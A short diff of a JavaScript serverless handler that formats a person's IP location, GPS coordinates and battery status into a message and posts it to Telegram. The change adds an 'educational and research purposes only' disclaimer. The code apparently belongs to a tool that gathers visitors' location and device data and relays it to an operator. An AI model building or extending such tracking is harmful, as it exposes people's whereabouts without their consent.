@@ -31,11 +31,13 @@ export default async (req, res) => {
     `- Region: ${d.location.region}\n` +
     `- Country: ${d.location.country}\n` +
     `- GPS: ${d.gps}\n\n` +
-    `"_Note: IP-based location may not be accurate._"\n\n` +
+    `_Note: IP-based location may not be accurate._\n\n` +
 
     `🔋 **Battery:**\n` +
     `- Level: ${d.batteryLevel}\n` +
-    `- Charging: ${d.charging}`;
+    `- Charging: ${d.charging}\n\n` +
+
+    `"Disclaimer: This data is collected for educational and research purposes only. It is not intended for misuse. Accuracy of the information is not guaranteed and may vary depending on browser settings, device limitations, or VPN/proxy usage."`;
 
     // Send message to Telegram
     await fetch(
